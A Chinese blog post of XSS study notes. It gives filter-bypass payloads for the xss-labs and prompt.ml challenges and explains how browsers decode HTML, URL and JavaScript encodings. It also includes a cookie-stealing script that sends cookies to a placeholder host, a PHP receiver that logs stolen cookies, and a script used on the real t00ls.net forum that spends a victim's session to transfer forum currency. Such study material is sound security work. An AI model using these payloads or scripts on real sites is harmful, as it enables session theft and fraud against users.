+<pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;scRipt&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level2.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;scRipt&gt;alert(1)&lt;/script&gt;&quot;&gt; &lt;input type=submit name=submit value=&quot;搜索&quot;/&gt; &lt;/form&gt;</code></pre><p>payload</p>
+<pre><code> &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code></pre><h3 id="level3-js事件绕过"><a href="#level3-js事件绕过" class="headerlink" title="level3 js事件绕过"></a>level3 js事件绕过</h3><p>这次两个都被转义了</p>
+<pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level3.php method=GET&gt; &lt;input name=keyword  value=&#39;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&#39;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>那就不用</p>
+<pre><code> &#39;onmouseover=&#39;alert(1)</code></pre><p>提交之后鼠标悬浮到上面即可触发</p>
+<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level4.php method=GET&gt; &lt;input name=keyword  value=&quot;scriptalert(1)/script&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>同样的绕过</p>
+<pre><code> &quot; onmouseover=&quot;alert(1)</code></pre><h3 id="level5-a标签绕过"><a href="#level5-a标签绕过" class="headerlink" title="level5 a标签绕过"></a>level5 a标签绕过</h3><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level5.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;scr_ipt&gt;alert(1)&lt;/script&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>但是现在会被过滤</p>
+<pre><code>&lt;input name=keyword  value=&quot;&#39;o_nmouseover=&#39;alert(1)&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;</code></pre><p>那么事件不能用了</p>
+<p>payload</p>
+<pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1);&quot;&gt;aaa&lt;/a&gt;</code></pre><p><img src="/posts/88edfa78/1581324449393.png" alt="img"></p>
+<pre><code> &lt;form action=level5.php method=GET&gt; &lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1);&quot;&gt;aaa&lt;/a&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;img src=x onerror=alert(1)&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level6.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;img sr_c=x o_nerror=alert(1)&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;       &lt;h2 align=center&gt;没有找到和&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;javascript:alert(1);&amp;quot;&amp;gt;aaa&amp;lt;/a&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level6.php method=GET&gt; &lt;input name=keyword  value=&quot;&quot;&gt;&lt;a hr_ef=&quot;javascript:alert(1);&quot;&gt;aaa&lt;/a&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>payload：(大写可以绕过)</p>
+<pre><code> &quot;&gt; &lt;a Href=&quot;javascript:alert(/1/)&quot;&gt;axxx&lt;/a&gt;</code></pre><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><pre><code> &lt;form action=level7.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;&gt;alert(1)&lt;/&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p><code>script</code> , <code>on</code>被过滤</p>
+<p>payload</p>
+<pre><code> &quot; oonninput=alert(1) &quot; &quot;oonnmouseover=&quot;alert(1)</code></pre><p>然后输入即可</p>
+<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>将 <code>javascript:alert(1)</code>  html实体编码即可</p>
+<pre><code> &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</code></pre><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>将 </p>
+<pre><code> javascript:alert(1) </code></pre><p>html实体编码，然后加上 <code>%0d</code></p>
+<pre><code> &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x0a;%0dhttp://www.0aa.me%0dalert(1)</code></pre><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>这一关有点玄学</p>
+<pre><code> &amp;t_sort=&quot; type=&quot;text&quot;onmouseover=alert`1` &quot;</code></pre><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>添加 referer </p>
+<pre><code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><p><img src="/posts/88edfa78/1582880021264.png" alt="img"></p>
+<h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>在User-agent 处注入</p>
+<pre><code> &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>在cookie处注入</p>
+<pre><code> &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><h3 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h3><p>iframe 引入了</p>
+<pre><code> &lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;</code></pre><h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>angular js</p>
+<pre><code> http://localhost/xss_test/level15.php?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></pre><h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>%0a 绕过空格</p>
+<pre><code> http://localhost/xss_test/level16.php?keyword=%3Cimg%0asrc=1%0aonerror=alert(1)%3E</code></pre><p>level17-20 都是flash相关的xss，就不写了</p>
+<h2 id="prompt1-to-win"><a href="#prompt1-to-win" class="headerlink" title="prompt1 to win"></a>prompt1 to win</h2><p><a href="http://prompt.ml/0" target="_blank" rel="noopener">http://prompt.ml/0</a></p>
+<h3 id="0"><a href="#0" class="headerlink" title="0"></a>0</h3><pre><code> &quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;&lt;&quot;</code></pre><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><pre><code> function escape(input) {     // tags stripping mechanism from ExtJS library     // Ext.util.Format.stripTags     var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;     input = input.replace(stripTagsRE, &#39;&#39;);      return &#39;&lt;article&gt;&#39; + input + &#39;&lt;/article&gt;&#39;; }        </code></pre><p>不能闭合标签</p>
+<pre><code> &lt;body/onload=prompt(1)// &lt;body onload=prompt(1)//</code></pre><p><code>onload</code> 事件属性，在页面加载之后立即执行一段JavaScript</p>
+<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><pre><code> function escape(input) {     //                      v-- frowny face     input = input.replace(/[=(]/g, &#39;&#39;);      // ok seriously, disallows equal signs and open parenthesis     return input; }        </code></pre><p>使用svg即可</p>
+<pre><code> &lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;/script&gt;  &lt;svg&gt;&lt;script&gt;prompt&amp;#x28 1)&lt;/script&gt;</code></pre><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><pre><code> function escape(input) {     // filter potential comment end delimiters     input = input.replace(/-&gt;/g, &#39;_&#39;);      // comment the input to avoid script execution     return &#39;&lt;!-- &#39; + input + &#39; --&gt;&#39;; }        </code></pre><p>新姿势get</p>
+<pre><code> --!&gt;&lt;script&gt;prompt(1)&lt;/script</code></pre><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><pre><code>function escape(input) {
+    // make sure the script belongs to own site
+    // sample script: http://prompt.ml/js/test.js
+    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
+        var script = document.createElement(&#39;script&#39;);
+        script.src = input;
+        return script.outerHTML;
+    } else {
+        return &#39;Invalid resource.&#39;;
+    }
+}        </code></pre><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><pre><code>function escape(input) {
+    // apply strict filter rules of level 0
+    // filter &quot;&gt;&quot; and event handlers
+    input = input.replace(/&gt;|on.+?=|focus/gi, &#39;_&#39;);
+
+    return &#39;&lt;input value=&quot;&#39; + input + &#39;&quot; type=&quot;text&quot;&gt;&#39;;
+}      </code></pre><p>新姿势。。</p>
+<pre><code>&quot;type=image src onerror
+=&quot;prompt(1)</code></pre><p>或者</p>
+<pre><code>&quot;type=image src onerror
+=prompt(1) </code></pre><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><pre><code> function escape(input) {     // let&#39;s do a post redirection     try {         // pass in formURL#formDataJSON         // e.g. http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}         var segments = input.split(&#39;#&#39;);         var formURL = segments[0];         var formData = JSON.parse(segments[1]);          var form = document.createElement(&#39;form&#39;);         form.action = formURL;         form.method = &#39;post&#39;;          for (var i in formData) {             var input = form.appendChild(document.createElement(&#39;input&#39;));             input.name = i;             input.setAttribute(&#39;value&#39;, formData[i]);         }          return form.outerHTML + &#39;                         \n\ &lt;script&gt;                                                  \n\     // forbid javascript: or vbscript: and data: stuff    \n\     if (!/script:|data:/i.test(document.forms[0].action)) \n\         document.forms[0].submit();                       \n\     else                                                  \n\         document.write(&quot;Action forbidden.&quot;)               \n\ &lt;/script&gt;                                                 \n\         &#39;;     } catch (e) {         return &#39;Invalid form data.&#39;;     } }      </code></pre><p>代码很复杂，但是其实就是一个构造表单的过程</p>
+<p><img src="/posts/88edfa78/1582896974234.png" alt="img"></p>
+<p>如果使用JavaScript伪协议，被过滤了</p>
+<pre><code> javascript:prompt(1)#{&quot;test&quot;:1}</code></pre><p>新姿势：</p>
+<p>action有这样的一个特性，如果前后都有action，访问action标签时访问的是后面的action的值。</p>
+<p>所以如果输入</p>
+<pre><code> javascript:prompt(1)#{&quot;action&quot;:1}</code></pre><p>得到的结果</p>
+<pre><code> &lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=&quot;1&quot;&gt;&lt;/form&gt;                          &lt;script&gt;                                                       // forbid javascript: or vbscript: and data: stuff         if (!/script:|data:/i.test(document.forms[0].action))          document.forms[0].submit();                            else                                                           document.write(&quot;Action forbidden.&quot;)                &lt;/script&gt;     </code></pre><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><pre><code> function escape(input) {     // filter potential start-tags     input = input.replace(/&lt;([a-zA-Z])/g, &#39;&lt;_$1&#39;);     // use all-caps for heading     input = input.toUpperCase();      // sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!     return &#39;&lt;h1&gt;&#39; + input + &#39;&lt;/h1&gt;&#39;; }     </code></pre><p>payload如下</p>
+<pre><code> &lt;ſcript/ſrc=//⒕₨&gt;&lt;/ſcript&gt;</code></pre><p><img src="/posts/88edfa78/1582897922738.png" alt="img"></p>
+<h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><pre><code> function escape(input) {     // (╯°□°）╯︵ ┻━┻     input = encodeURIComponent(input).replace(/prompt/g, &#39;alert&#39;);     // ┬──┬ •ノ( ゜-゜ノ) chill out bro     input = input.replace(/&#39;/g, &#39;&#39;);      // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO     return &#39;&lt;script&gt;&#39; + input + &#39;&lt;/script&gt; &#39;; }        </code></pre><p>组合一下。</p>
+<pre><code> prom&#39;pt(1)</code></pre><h2 id="XSS基础知识"><a href="#XSS基础知识" class="headerlink" title="XSS基础知识"></a>XSS基础知识</h2><pre><code>&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://xxxx/a?&quot;+escape(document.cookie);&lt;/script&gt;</code></pre><p>escape一般会进行URL编码，但是 该方法不会对 ASCII 字母和数字进行编码，也不会对下面这些 ASCII 标点符号进行编码： * @ - _ + . / 。其他所有的字符都会被转义序列替换。</p>
+<p>常用的payload</p>
+<pre><code> &lt;script&gt;alert(/xss/);&lt;/script&gt; //经典语句  &lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt; &lt;img src=x onerror=alert(1)&gt; &lt;svg onload=alert(1)&gt; &lt;a href = javasript:alert(1)&gt;</code></pre><h3 id="简单地XSS接收平台"><a href="#简单地XSS接收平台" class="headerlink" title="简单地XSS接收平台"></a>简单地XSS接收平台</h3><p>js脚本</p>
+<pre><code> var img = document.createElement(&quot;img&quot;); img.src = &quot;http://xxx/x.php?cookie=&quot;+document.cookie; document.body.appendChild(img);</code></pre><p>接收端</p>
+<pre><code> &lt;?php   $victim = &#39;XXS得到的 cookie:&#39;. $_SERVER[&#39;REMOTE_ADDR&#39;]. &#39;:&#39; .$_GET[&#39;cookie&#39;].&quot;\r\n\r\n&quot;;   echo htmlspecialchars($_GET[&#39;cookie&#39;]); $myfile = fopen(&quot;/aixi/XSS/xss_victim.txt&quot;, &quot;a&quot;); fwrite($myfile, $victim); ?&gt;</code></pre><h3 id="从浏览器解码看xss"><a href="#从浏览器解码看xss" class="headerlink" title="从浏览器解码看xss"></a>从浏览器解码看xss</h3><h4 id="html编码解码"><a href="#html编码解码" class="headerlink" title="html编码解码"></a>html编码解码</h4><p>浏览器会先解析html，然后解析xss，所以，如果在xss中使用到了html实体编码是没有用的</p>
+<pre><code> &lt;script&gt;alert&amp;#40;&#39;1&#39;)&lt;/script&gt;</code></pre><p>但是却可以触发，原因是 svg支持xml,在XML中实体会自动转义,除了<code>&lt;![CDATA[</code>和<code>]]&gt;</code>包含的实体</p>
+<pre><code> &lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</code></pre><h4 id="JavaScript编码解码"><a href="#JavaScript编码解码" class="headerlink" title="JavaScript编码解码"></a>JavaScript编码解码</h4><p>下面无法触发，原因是浏览器看到 <code>onerror</code> 之后，调用js解析器，但是在js中，<strong>单引号，双引号和圆括号等属于控制字符，编码后将无法识别。所以对于防御来说，应该编码这些控制字符</strong></p>
+<pre><code>&lt;img src=&quot;1&quot; onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029&gt;</code></pre><p>所以我们需要修改成这样</p>
+<pre><code>&lt;img src=&quot;1&quot; onerror=\u0061\u006c\u0065\u0072\u0074(&#39;\u0031&#39;)&gt;</code></pre><p>结合上面的html编码，我们可以将 <code>\u0061\u006c\u0065\u0072\u0074(&#39;\u0031&#39;)</code> 再进行一次html实体编码(这样就算你过滤了 <code>&#39;</code>,照样可以绕过)</p>
+<pre><code>&lt;img src=&quot;1&quot; onerror=&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#50;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;&amp;#40;&amp;#39;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#51;&amp;#49;&amp;#39;&amp;#41;&gt;</code></pre><p>比如开发人员单纯的设置HTML实体编码为防御xss的手段，但是用户输入点确实在alert中</p>
+<pre><code>&lt;img src = &quot;https://text.com&quot; onclick = &#39;alert(输入点)&#39;&gt;</code></pre><p>如果用户正常输入的话凡是存在<code>&lt;</code> ,<code>&quot;</code> 等都能被转码</p>
+<p>但是攻击者可以通过语句<code>&quot;);alert(&quot;test</code> 然后HTML编码即可绕过</p>
+<pre><code>&lt;img src = &quot;https://gss1.bdstatic.com&quot; onclick = &#39;alert(&quot;FIRST XSS | &amp;#34;&amp;#41;&amp;#59;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#116;&amp;#101;&amp;#115;&amp;#116;&quot;)&#39;&gt;</code></pre><p>发现弹窗了两次,是因为服务端进行一个HTML解码发现存在两个<code>alert()</code>弹窗于是直接弹</p>
+<p>所以对于这种情况，正确防御XSS的方法应该是先javascript编码然后再进行HTML编码</p>
+<h4 id="URL编码解码"><a href="#URL编码解码" class="headerlink" title="URL编码解码"></a>URL编码解码</h4><pre><code>&lt;a href = &quot;javascript:alert(3)&quot;&gt;hhhhh&lt;a&gt;</code></pre><p>浏览器看到<code>&lt;</code>满足HTML解码的条件，然后看到<code>href</code> 满足了URL编码额条件，最后看到<code>javascript</code>满足JS 解码的条件</p>
+<p>于是我们可以反过来编码</p>
+<p>作为攻击者我们应该反过来首先进行一个JS编码</p>
+<pre><code> &lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(3)&quot;&gt;hhhhhh&lt;/a&gt;</code></pre><p>然后进行一个URL编码</p>
+<pre><code> &lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;hhhhhh&lt;/a&gt;</code></pre><p>最后进行一个HTML编码</p>
+<pre><code> &lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;hhhhhh&lt;/a&gt;</code></pre><p>其他栗子：</p>
+<pre><code> &lt;a onclick=&quot;window.open(&#39;value1&#39;)&quot; href=&quot;javascript:window.open(value2)&quot;&gt;</code></pre><p>这里的value1：浏览器看到<code>&lt;</code>标签，可以HTML解码，然后看到<code>onclick</code>可以进行JS解码，最后看到<code>window.open</code>可以进行URL解码</p>
+<p>对于value2而言：浏览器看到<code>&lt;</code>标签进行一个HTML解码，然后看到<code>href</code>进行一个URL解码，再之后看到<code>javascript</code>进行一个JS解码，最后看到了<code>window.open</code>编码进行一个URL解码</p>
+<h3 id="XSS-payload判断是否执行练习"><a href="#XSS-payload判断是否执行练习" class="headerlink" title="XSS payload判断是否执行练习"></a>XSS payload判断是否执行练习</h3><h4 id="1-协议被编码导致无法执行"><a href="#1-协议被编码导致无法执行" class="headerlink" title="1 协议被编码导致无法执行"></a>1 协议被编码导致无法执行</h4><pre><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;</code></pre><p>href 丢给URL模块解析，但是协议无法识别（即被编码的<code>javascript:</code>），解码失败，不会被执行</p>
+<h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><pre><code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;</code></pre><p>先进行htm解码得到  </p>
+<pre><code>javascript:%61%6c%65%72%74%28%32%29</code></pre><p>然后href丢给URL模块解析，得到</p>
+<pre><code>javascript:alert(2)</code></pre><p>可以执行</p>
+<h4 id="3-协议被编码，同1"><a href="#3-协议被编码，同1" class="headerlink" title="3 协议被编码，同1"></a>3 协议被编码，同1</h4><pre><code>&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</code></pre><h4 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h4><pre><code>&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</code></pre><p>无法执行，因为从HTML解析机制看，在读取<code>&lt;div&gt;</code>之后进入数据状态，<code>&amp;#60;</code>会被HTML解码，但不会进入标签开始状态，当然也就不会创建<code>img</code>元素，也就不会执行</p>
+<h4 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h4><pre><code>&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</code></pre><p>无法执行，<code>&lt;textarea&gt;</code>是<code>RCDATA</code>元素（RCDATA elements），可以容纳文本和字符引用，注意<strong>不能容纳其他元素</strong>，HTML解码得到</p>
+<pre><code>&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;</code></pre><h4 id="6-同5-无法执行"><a href="#6-同5-无法执行" class="headerlink" title="6  同5 无法执行"></a>6  同5 无法执行</h4><pre><code>&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;</code></pre><h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><pre><code>&lt;button onclick=&quot;confirm(&#39;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;</code></pre><p>这里<code>onclick</code>中为标签的属性值（类比2中的<code>href</code>），会被HTML解码，得到</p>
+<pre><code>&lt;button onclick=&quot;confirm(&#39;7&#39;);&quot;&gt;Button&lt;/button&gt;</code></pre><p>然后被执行</p>
+<h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><pre><code> &lt;button onclick=&quot;confirm(&#39;8\u0027);&quot;&gt;Button&lt;/button&gt;</code></pre><p><code>onclick</code>中的值会交给JS处理，在JS中只有字符串和<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Identifier" target="_blank" rel="noopener">标识符</a>能用Unicode表示，<code>&#39;</code>显然不行，JS执行失败</p>
+<h4 id="9-1"><a href="#9-1" class="headerlink" title="9"></a>9</h4><pre><code> &lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</code></pre><p>无法执行</p>
+<p><code>script</code>属于原始文本元素(Raw text elements)，<strong>只可以容纳文本</strong>，注意<strong>没有字符引用</strong>，于是直接由JS处理，JS也认不出来，执行失败</p>
+<p>原始文本元素(Raw text elements)有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></p>
+<h4 id="10"><a href="#10" class="headerlink" title="10"></a>10</h4><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</code></pre><p>这里js中可以使用Unicode的，只是有些特殊字符不能编码，可以执行</p>
+<h4 id="11-同8，关键字符被编码"><a href="#11-同8，关键字符被编码" class="headerlink" title="11 同8，关键字符被编码"></a>11 同8，关键字符被编码</h4><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;/script&gt;</code></pre><p>不能执行</p>
+<h4 id="12-由于解码是字符串导致无法执行"><a href="#12-由于解码是字符串导致无法执行" class="headerlink" title="12 由于解码是字符串导致无法执行"></a>12 由于解码是字符串导致无法执行</h4><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;/script&gt;</code></pre><p>这里看似将没毛病，但是这里<code>\u0031\u0032</code>在解码的时候会被解码为字符串<code>12</code>，注意是<strong>字符串</strong>，不是数字，文字显然是需要引号的，JS执行失败</p>
+<p>这样就行了</p>
+<pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&quot;\u0031\u0032&quot;)&lt;/script&gt;</code></pre><h4 id="14-同8无法执行"><a href="#14-同8无法执行" class="headerlink" title="14 同8无法执行"></a>14 同8无法执行</h4><pre><code> &lt;script&gt;alert(&#39;13\u0027)&lt;/script&gt;</code></pre><h4 id="15"><a href="#15" class="headerlink" title="15"></a>15</h4><pre><code> &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;/a&gt;</code></pre><p>html解码，得到</p>
+<pre><code> javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</code></pre><p>href识别出是JavaScript协议，URL解码得到</p>
+<pre><code> javascript:\u0061\u006c\u0065\u0072\u0074(15)</code></pre><p>可以执行</p>
+<p>总结</p>
+<ol>
+<li><script>和<style>数据只能有文本，不会有HTML解码和URL解码操作</li>
+<li><code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>里会有HTML解码操作，但不会有子元素</li>
+<li>其他元素数据（如<code>div</code>）和元素属性数据（如<code>href</code>）中会有HTML解码操作</li>
+<li>部分属性（如<code>href</code>）会有URL解码操作，但URL中的协议需为ASCII</li>
+<li>JavaScript会对字符串和标识符Unicode解码</li>
+</ol>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="tools网站markdown渲染导致xss"><a href="#tools网站markdown渲染导致xss" class="headerlink" title="tools网站markdown渲染导致xss"></a>tools网站markdown渲染导致xss</h3><p><a href="https://www.hackersb.cn/hacker/235.html" target="_blank" rel="noopener">参考</a></p>
+<p>JavaScript伪协议直接弹框</p>
+<p><img src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874638329.png" alt="img"></p>
+<p>Discuz的每一步操作都需要 formhash,获取到这个值之后就可以了</p>
+<p><img src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874680248.png" alt="img"></p>
+<p>使用图片来触发xss</p>
+<p><img src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874701778.png" alt="img"></p>
+<p>最后的payload</p>
+<pre><code> ![头像&quot; onload=alert(1);//](https://www.t00ls.net/uc_server/data/avatar/000/01/08/66_avatar_middle.jpg)</code></pre><p>之后编写js代码来偷走tubi，</p>
+<pre><code> var formhash = document.getElementsByName(&#39;formhash&#39;)[0].value; fetch(&quot;https://www.t00ls.net/misc.php?action=userrate&amp;userratesubmit=yes&amp;infloat=yes&amp;inajax=1&amp;inajax=1&quot;, {   method: &quot;POST&quot;,   credentials: &quot;include&quot;,   headers: {     &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,     &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,     &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,     &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,     &quot;Connection&quot;: &#39;keep-alive&#39;,   },   body: &quot;formhash=&quot; + formhash + &quot;&amp;tid=39705&amp;do=dashang&amp;handlekey=userrate&amp;score=%2B10&amp;reason=thanks&quot; }).then(function(res) {   if (res.ok) {     alert(&quot;谢谢你的10Tubi！！！&quot;);   } }, function(e) {   alert(&quot;Error submitting form!&quot;); });</code></pre><p>然后插入图片，引用这个js即可</p>
+</script></li></ol>
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>XSS学习记录</p>
